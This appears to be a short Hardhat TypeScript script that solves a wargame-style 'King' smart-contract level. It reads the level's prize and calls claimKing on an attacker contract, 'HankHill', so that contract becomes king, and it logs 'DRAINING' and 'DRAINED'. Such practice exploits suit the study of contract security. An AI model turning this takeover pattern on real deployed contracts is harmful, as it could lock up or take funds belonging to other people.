import { ethers } from "hardhat"
import { LEVEL_ADDRESSES, PLAYER, ADDRESSES } from "../consts"
import { getSigner } from "../utils"
import { providers } from "ethers"

async function pwn() {
    const signer = await getSigner()

    const contract = await ethers.getContractAt(
        "HankHill",
        ADDRESSES.hankHill,
        signer
    )
    const level = new ethers.Contract(
        LEVEL_ADDRESSES.king,
        ["function prize() public view returns (uint prize)"],
        signer
    )
    const prize = ethers.utils.formatUnits((await level.prize()), 18)
    console.log(prize)
    const call = await contract.claimKing({
        value: ethers.utils.parseUnits(prize, 18)
    })
    // const call = await signer?.sendTransaction({
    //     to: contract.address,
    //     from: PLAYER,
    //     value: ethers.utils.parseUnits("0.000000000069")
    // })

    console.log(`DRAINING`)
    const receipt = await call?.wait()
    console.log(receipt)
    console.log("DRAINED")
}

pwn()